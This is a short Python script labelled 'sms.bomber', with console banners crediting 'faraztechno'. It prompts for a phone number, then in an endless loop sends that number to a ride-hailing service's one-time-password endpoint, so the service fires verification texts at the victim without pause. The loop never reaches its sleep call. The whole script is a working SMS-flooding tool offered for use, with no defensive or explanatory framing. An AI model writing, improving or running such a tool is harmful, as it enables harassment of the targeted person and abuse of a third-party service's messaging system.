import requests
import time
import os
from rich import print
from rich.console import group
from rich.panel import Panel
@group()
def get_panels():
    yield Panel("sms.bomber", style="on blue")
    yield Panel("faraztechno", style="on red")

print(Panel(get_panels()))
time.sleep(3)
from rich.console import Console
console = Console()

os.system("cls")
console.rule("[bold red] faraztechno")
console.print ("github : https://github.com/faraztechno" ) 
Enter =input("enter number:")
while True:
 url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
 number={"cellphone":"+98"+Enter}
 sms =requests.post(url,data=number)
 print(sms.status_code)
time.sleep(7)
